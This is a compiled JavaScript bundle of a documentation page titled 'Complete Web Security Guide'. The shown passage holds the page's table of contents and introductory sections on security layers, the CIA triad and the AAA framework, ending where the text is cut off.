"use strict";(self.webpackChunkdev_enigma=self.webpackChunkdev_enigma||[]).push([[11672],{28453:(e,n,s)=>{s.d(n,{R:()=>o,x:()=>a});var r=s(96540);const t={},i=r.createContext(t);function o(e){const n=r.useContext(i);return r.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:o(e.components),r.createElement(i.Provider,{value:n},e.children)}},35978:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>c,contentTitle:()=>o,default:()=>u,frontMatter:()=>i,metadata:()=>a,toc:()=>l});var r=s(74848),t=s(28453);const i={},o="\ud83d\udd10 Complete Web Security Guide",a={id:"Interview Prep 2026/Complete Web Security Guide",title:"\ud83d\udd10 Complete Web Security Guide",description:"A comprehensive guide covering web security fundamentals, common vulnerabilities, and modern best practices for building secure web applications.",source:"@site/docs/08-Interview Prep 2026/Complete Web Security Guide.mdx",sourceDirName:"08-Interview Prep 2026",slug:"/Interview Prep 2026/Complete Web Security Guide",permalink:"/docs/Interview Prep 2026/Complete Web Security Guide",draft:!1,unlisted:!1,editUrl:"https://github.com/carefree-ladka/docs/08-Interview Prep 2026/Complete Web Security Guide.mdx",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Complete Networking Guide: TCP/IP, SSL/TLS, Protocols & More",permalink:"/docs/Interview Prep 2026/Complete Networking Guide: TCP, IP, SSL, TLS, Protocols"},next:{title:"Critical Rendering Path - Complete Guide",permalink:"/docs/Interview Prep 2026/Critical Rendering Path - Complete Guide"}},c={},l=[{value:"\ud83d\udccb Table of Contents",id:"-table-of-contents",level:2},{value:"1. Introduction to Web Security",id:"1-introduction-to-web-security",level:2},{value:"What is Web Security?",id:"what-is-web-security",level:3},{value:"Why Web Security Matters",id:"why-web-security-matters",level:3},{value:"Security Layers",id:"security-layers",level:3},{value:"2. Core Security Principles",id:"2-core-security-principles",level:2},{value:"CIA Triad",id:"cia-triad",level:3},{value:"AAA Framework",id:"aaa-framework",level:3},{value:"Defense in Depth",id:"defense-in-depth",level:3},{value:"Principle of Least Privilege",id:"principle-of-least-privilege",level:3},{value:"3. Browser &amp; Frontend Security",id:"3-browser--frontend-security",level:2},{value:"Same-Origin Policy (SOP)",id:"same-origin-policy-sop",level:3},{value:"Cross-Origin Resource Sharing (CORS)",id:"cross-origin-resource-sharing-cors",level:3},{value:"Cross-Site Scripting (XSS)",id:"cross-site-scripting-xss",level:3},{value:"Cross-Site Request Forgery (CSRF)",id:"cross-site-request-forgery-csrf",level:3},{value:"Clickjacking",id:"clickjacking",level:3},{value:"Content Security Policy (CSP)",id:"content-security-policy-csp",level:3},{value:"Subresource Integrity (SRI)",id:"subresource-integrity-sri",level:3},{value:"4. Cookie Security",id:"4-cookie-security",level:2},{value:"Cookie Flags Explained",id:"cookie-flags-explained",level:3},{value:"Cookie Best Practices",id:"cookie-best-practices",level:3},{value:"Session Management",id:"session-management",level:3},{value:"5. Authentication &amp; Authorization",id:"5-authentication--authorization",level:2},{value:"Authentication Methods",id:"authentication-methods",level:3},{value:"Password Security",id:"password-security",level:3},{value:"JSON Web Tokens (JWT)",id:"json-web-tokens-jwt",level:3},{value:"OAuth 2.0 &amp; OpenID Connect",id:"oauth-20--openid-connect",level:3},{value:"Multi-Factor Authentication (MFA)",id:"multi-factor-authentication-mfa",level:3},{value:"WebAuthn &amp; Passkeys",id:"webauthn--passkeys",level:3},{value:"Authorization Patterns",id:"authorization-patterns",level:3},{value:"6. Backend &amp; API Security",id:"6-backend--api-security",level:2},{value:"Input Validation",id:"input-validation",level:3},{value:"SQL Injection",id:"sql-injection",level:3},{value:"NoSQL Injection",id:"nosql-injection",level:3},{value:"Command Injection",id:"command-injection",level:3},{value:"Insecure Direct Object References (IDOR)",id:"insecure-direct-object-references-idor",level:3},{value:"Server-Side Request Forgery (SSRF)",id:"server-side-request-forgery-ssrf",level:3},{value:"XML External Entity (XXE)",id:"xml-external-entity-xxe",level:3},{value:"API Security Best Practices",id:"api-security-best-practices",level:3},{value:"7. Transport &amp; Network Security",id:"7-transport--network-security",level:2},{value:"HTTPS &amp; TLS",id:"https--tls",level:3},{value:"Certificate Management",id:"certificate-management",level:3},{value:"HTTP Strict Transport Security (HSTS)",id:"http-strict-transport-security-hsts",level:3},{value:"DNS Security",id:"dns-security",level:3},{value:"DDoS Protection",id:"ddos-protection",level:3},{value:"8. Security Headers",id:"8-security-headers",level:2},{value:"Essential Headers Overview",id:"essential-headers-overview",level:3},{value:"Content-Security-Policy (Detailed)",id:"content-security-policy-detailed",level:3},{value:"X-Frame-Options",id:"x-frame-options",level:3},{value:"X-Content-Type-Options",id:"x-content-type-options",level:3},{value:"Referrer-Policy",id:"referrer-policy",level:3},{value:"Permissions-Policy",id:"permissions-policy",level:3},{value:"Complete Header Configuration",id:"complete-header-configuration",level:3},{value:"9. OWASP Top 10 Deep Dive",id:"9-owasp-top-10-deep-dive",level:2},{value:"A01: Broken Access Control",id:"a01-broken-access-control",level:3},{value:"A02: Cryptographic Failures",id:"a02-cryptographic-failures",level:3},{value:"A03: Injection",id:"a03-injection",level:3},{value:"A04: Insecure Design",id:"a04-insecure-design",level:3},{value:"A05: Security Misconfiguration",id:"a05-security-misconfiguration",level:3},{value:"A06: Vulnerable and Outdated Components",id:"a06-vulnerable-and-outdated-components",level:3},{value:"A07: Identification and Authentication Failures",id:"a07-identification-and-authentication-failures",level:3},{value:"A08: Software and Data Integrity Failures",id:"a08-software-and-data-integrity-failures",level:3},{value:"A09: Security Logging and Monitoring Failures",id:"a09-security-logging-and-monitoring-failures",level:3},{value:"A10: Server-Side Request Forgery (SSRF)",id:"a10-server-side-request-forgery-ssrf",level:3},{value:"10. Modern Security Practices",id:"10-modern-security-practices",level:2},{value:"Zero Trust Architecture",id:"zero-trust-architecture",level:3},{value:"Supply Chain Security",id:"supply-chain-security",level:3},{value:"Secret Management",id:"secret-management",level:3},{value:"Security Monitoring &amp; Logging",id:"security-monitoring--logging",level:3},{value:"Cross-Site Scripting (XSS)",id:"cross-site-scripting-xss-1",level:3},{value:"Cross-Site Request Forgery (CSRF)",id:"cross-site-request-forgery-csrf-1",level:3},{value:"Clickjacking",id:"clickjacking-1",level:3},{value:"Content Security Policy (CSP)",id:"content-security-policy-csp-1",level:3},{value:"Subresource Integrity (SRI)",id:"subresource-integrity-sri-1",level:3},{value:"4. Cookie Security",id:"4-cookie-security-1",level:2},{value:"Cookie Flags Explained",id:"cookie-flags-explained-1",level:3},{value:"Cookie Best Practices",id:"cookie-best-practices-1",level:3},{value:"Session Management",id:"session-management-1",level:3},{value:"5. Authentication &amp; Authorization",id:"5-authentication--authorization-1",level:2},{value:"Authentication Methods",id:"authentication-methods-1",level:3},{value:"Password Security",id:"password-security-1",level:3},{value:"JSON Web Tokens (JWT)",id:"json-web-tokens-jwt-1",level:3},{value:"OAuth 2.0 &amp; OpenID Connect",id:"oauth-20--openid-connect-1",level:3},{value:"Multi-Factor Authentication (MFA)",id:"multi-factor-authentication-mfa-1",level:3},{value:"WebAuthn &amp; Passkeys",id:"webauthn--passkeys-1",level:3},{value:"Authorization Patterns",id:"authorization-patterns-1",level:3},{value:"6. Backend &amp; API Security",id:"6-backend--api-security-1",level:2},{value:"Input Validation",id:"input-validation-1",level:3},{value:"SQL Injection",id:"sql-injection-1",level:3},{value:"NoSQL Injection",id:"nosql-injection-1",level:3},{value:"Command Injection",id:"command-injection-1",level:3},{value:"Insecure Direct Object References (IDOR)",id:"insecure-direct-object-references-idor-1",level:3},{value:"Server-Side Request Forgery (SSRF)",id:"server-side-request-forgery-ssrf-1",level:3},{value:"XML External Entity (XXE)",id:"xml-external-entity-xxe-1",level:3},{value:"API Security Best Practices",id:"api-security-best-practices-1",level:3},{value:"7. Transport &amp; Network Security",id:"7-transport--network-security-1",level:2},{value:"HTTPS &amp; TLS",id:"https--tls-1",level:3},{value:"Certificate Management",id:"certificate-management-1",level:3},{value:"HTTP Strict Transport Security (HSTS)",id:"http-strict-transport-security-hsts-1",level:3}];function d(e){const n={a:"a",blockquote:"blockquote",code:"code",em:"em",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,t.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"-complete-web-security-guide",children:"\ud83d\udd10 Complete Web Security Guide"})}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:"A comprehensive guide covering web security fundamentals, common vulnerabilities, and modern best practices for building secure web applications."}),"\n"]}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"-table-of-contents",children:"\ud83d\udccb Table of Contents"}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.a,{href:"#1-introduction-to-web-security",children:"Introduction to Web Security"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#what-is-web-security",children:"What is Web Security?"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#why-web-security-matters",children:"Why Web Security Matters"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#security-layers",children:"Security Layers"})}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.a,{href:"#2-core-security-principles",children:"Core Security Principles"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#cia-triad",children:"CIA Triad"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#aaa-framework",children:"AAA Framework"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#defense-in-depth",children:"Defense in Depth"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#principle-of-least-privilege",children:"Principle of Least Privilege"})}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.a,{href:"#3-browser--frontend-security",children:"Browser & Frontend Security"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#same-origin-policy-sop",children:"Same-Origin Policy (SOP)"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#cross-origin-resource-sharing-cors",children:"Cross-Origin Resource Sharing (CORS)"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#cross-site-scripting-xss",children:"Cross-Site Scripting (XSS)"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#cross-site-request-forgery-csrf",children:"Cross-Site Request Forgery (CSRF)"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#clickjacking",children:"Clickjacking"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#content-security-policy-csp",children:"Content Security Policy (CSP)"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#subresource-integrity-sri",children:"Subresource Integrity (SRI)"})}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.a,{href:"#4-cookie-security",children:"Cookie Security"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#cookie-flags-explained",children:"Cookie Flags Explained"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#cookie-best-practices",children:"Cookie Best Practices"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#session-management",children:"Session Management"})}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.a,{href:"#5-authentication--authorization",children:"Authentication & Authorization"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#authentication-methods",children:"Authentication Methods"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#password-security",children:"Password Security"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#json-web-tokens-jwt",children:"JSON Web Tokens (JWT)"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#oauth-20--openid-connect",children:"OAuth 2.0 & OpenID Connect"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#multi-factor-authentication-mfa",children:"Multi-Factor Authentication (MFA)"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#webauthn--passkeys",children:"WebAuthn & Passkeys"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#authorization-patterns",children:"Authorization Patterns"})}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.a,{href:"#6-backend--api-security",children:"Backend & API Security"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#input-validation",children:"Input Validation"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#sql-injection",children:"SQL Injection"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#nosql-injection",children:"NoSQL Injection"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#command-injection",children:"Command Injection"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#insecure-direct-object-references-idor",children:"Insecure Direct Object References (IDOR)"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#server-side-request-forgery-ssrf",children:"Server-Side Request Forgery (SSRF)"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#xml-external-entity-xxe",children:"XML External Entity (XXE)"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#api-security-best-practices",children:"API Security Best Practices"})}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.a,{href:"#7-transport--network-security",children:"Transport & Network Security"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#https--tls",children:"HTTPS & TLS"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#certificate-management",children:"Certificate Management"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#http-strict-transport-security-hsts",children:"HTTP Strict Transport Security (HSTS)"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#dns-security",children:"DNS Security"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#ddos-protection",children:"DDoS Protection"})}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.a,{href:"#8-security-headers",children:"Security Headers"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#essential-headers-overview",children:"Essential Headers Overview"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#content-security-policy-detailed",children:"Content-Security-Policy"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#x-frame-options",children:"X-Frame-Options"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#x-content-type-options",children:"X-Content-Type-Options"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#referrer-policy",children:"Referrer-Policy"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#permissions-policy",children:"Permissions-Policy"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#complete-header-configuration",children:"Complete Header Configuration"})}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.a,{href:"#9-owasp-top-10-deep-dive",children:"OWASP Top 10 Deep Dive"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#a01-broken-access-control",children:"A01 Broken Access Control"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#a02-cryptographic-failures",children:"A02 Cryptographic Failures"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#a03-injection",children:"A03 Injection"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#a04-insecure-design",children:"A04 Insecure Design"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#a05-security-misconfiguration",children:"A05 Security Misconfiguration"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#a06-vulnerable-components",children:"A06 Vulnerable Components"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#a07-authentication-failures",children:"A07 Authentication Failures"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#a08-softwaredata-integrity-failures",children:"A08 Software/Data Integrity Failures"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#a09-logging--monitoring-failures",children:"A09 Logging & Monitoring Failures"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#a10-server-side-request-forgery",children:"A10 Server-Side Request Forgery"})}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.a,{href:"#10-modern-security-practices",children:"Modern Security Practices"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#zero-trust-architecture",children:"Zero Trust Architecture"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#supply-chain-security",children:"Supply Chain Security"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#dependency-management",children:"Dependency Management"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#secret-management",children:"Secret Management"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#security-monitoring--logging",children:"Security Monitoring & Logging"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#incident-response",children:"Incident Response"})}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.a,{href:"#11-framework-specific-security",children:"Framework-Specific Security"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#react-security",children:"React Security"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#nextjs-security",children:"Next.js Security"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#nodejsexpress-security",children:"Node.js/Express Security"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#rest-api-security",children:"REST API Security"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#graphql-security",children:"GraphQL Security"})}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.a,{href:"#12-testing--auditing",children:"Testing & Auditing"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#security-testing-approaches",children:"Security Testing Approaches"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#penetration-testing",children:"Penetration Testing"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#static-application-security-testing-sast",children:"Static Application Security Testing (SAST)"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#dynamic-application-security-testing-dast",children:"Dynamic Application Security Testing (DAST)"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#security-audit-checklist",children:"Security Audit Checklist"})}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.a,{href:"#13-compliance--standards",children:"Compliance & Standards"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#gdpr",children:"GDPR"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#pci-dss",children:"PCI DSS"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#hipaa",children:"HIPAA"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#soc-2",children:"SOC 2"})}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.a,{href:"#14-security-checklists",children:"Security Checklists"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#frontend-security-checklist",children:"Frontend Security Checklist"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#backend-security-checklist",children:"Backend Security Checklist"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#api-security-checklist",children:"API Security Checklist"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#deployment-security-checklist",children:"Deployment Security Checklist"})}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.a,{href:"#15-resources--tools",children:"Resources & Tools"})}),"\n"]}),"\n"]}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"1-introduction-to-web-security",children:"1. Introduction to Web Security"}),"\n",(0,r.jsx)(n.h3,{id:"what-is-web-security",children:"What is Web Security?"}),"\n",(0,r.jsx)(n.p,{children:"Web security encompasses all practices, technologies, and processes designed to protect web applications, their users, and data from unauthorized access, attacks, and exploitation. It's a continuous process of identifying vulnerabilities and implementing protective measures."}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Key Components:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Application Security"}),": Protecting the code and logic"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Data Security"}),": Protecting sensitive information"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Network Security"}),": Protecting communication channels"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Infrastructure Security"}),": Protecting servers and hosting environments"]}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"why-web-security-matters",children:"Why Web Security Matters"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Real-World Impact:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Data Breaches"}),": Average cost of $4.45M per breach (2023)"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Reputation Damage"}),": Loss of customer trust"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Legal Consequences"}),": GDPR fines up to \u20ac20M or 4% of revenue"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Business Disruption"}),": Downtime and lost revenue"]}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Common Attack Vectors:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"43% of cyberattacks target small businesses"}),"\n",(0,r.jsx)(n.li,{children:"95% of cybersecurity breaches are due to human error"}),"\n",(0,r.jsx)(n.li,{children:"Web applications are involved in 26% of data breaches"}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"security-layers",children:"Security Layers"}),"\n",(0,r.jsx)(n.p,{children:"Web security should be implemented across three layers:"}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Client Layer (Browser/Frontend)"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Input validation"}),"\n",(0,r.jsx)(n.li,{children:"Secure cookie handling"}),"\n",(0,r.jsx)(n.li,{children:"XSS prevention"}),"\n",(0,r.jsx)(n.li,{children:"CSRF protection"}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Server Layer (Backend/APIs)"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Authentication & authorization"}),"\n",(0,r.jsx)(n.li,{children:"SQL injection prevention"}),"\n",(0,r.jsx)(n.li,{children:"Rate limiting"}),"\n",(0,r.jsx)(n.li,{children:"Secure session management"}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(n.li,{children:["\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Network Layer (Infrastructure)"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"HTTPS/TLS encryption"}),"\n",(0,r.jsx)(n.li,{children:"Firewall configuration"}),"\n",(0,r.jsx)(n.li,{children:"DDoS protection"}),"\n",(0,r.jsx)(n.li,{children:"DNS security"}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"2-core-security-principles",children:"2. Core Security Principles"}),"\n",(0,r.jsx)(n.h3,{id:"cia-triad",children:"CIA Triad"}),"\n",(0,r.jsx)(n.p,{children:"The foundation of information security:"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"1. Confidentiality"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Data is accessible only to authorized parties"}),"\n",(0,r.jsx)(n.li,{children:"Encryption at rest and in transit"}),"\n",(0,r.jsx)(n.li,{children:"Access control mechanisms"}),"\n",(0,r.jsx)(n.li,{children:"Data classification"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"2. Integrity"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Data remains accurate and unaltered"}),"\n",(0,r.jsx)(n.li,{children:"Hash functions for verification"}),"\n",(0,r.jsx)(n.li,{children:"Digital signatures"}),"\n",(0,r.jsx)(n.li,{children:"Audit trails"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"3. Availability"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Systems remain accessible to authorized users"}),"\n",(0,r.jsx)(n.li,{children:"Redundancy and backups"}),"\n",(0,r.jsx)(n.li,{children:"DDoS protection"}),"\n",(0,r.jsx)(n.li,{children:"Disaster recovery plans"}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"aaa-framework",children:"AAA Framework"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Authentication"})," - ",(0,r.jsx)(n.em,{children:"Who are you?"})]}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Verifying identity"}),"\n",(0,r.jsx)(n.li,{children:"Username/password, biometrics, tokens"}),"\n",(0,r.jsx)(n.li,{children:"Multi-factor authentication"}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Authorization"})," - ",(0,r.jsx)(n.em,{children:"What can you do?"})]}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Determining access rights"}),"\n",(0,r.jsx)(n.li,{children:"Role-based access control (RBAC)"}),"\n",(0,r.jsx)(n.li,{children:"Attribute-based access control (ABAC)"}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Accounting/Auditing"})," - ",(0,r.jsx)(n.em,{children:"What did you do?"})]}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Tracking user activities"}),"\n",(0,r.jsx)(n.li,{children:"Logging and monitoring"}),"\n",(0,r.jsx)(n.li,{children:"Compliance and forensics"}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"defense-in-depth",children:"Defense in 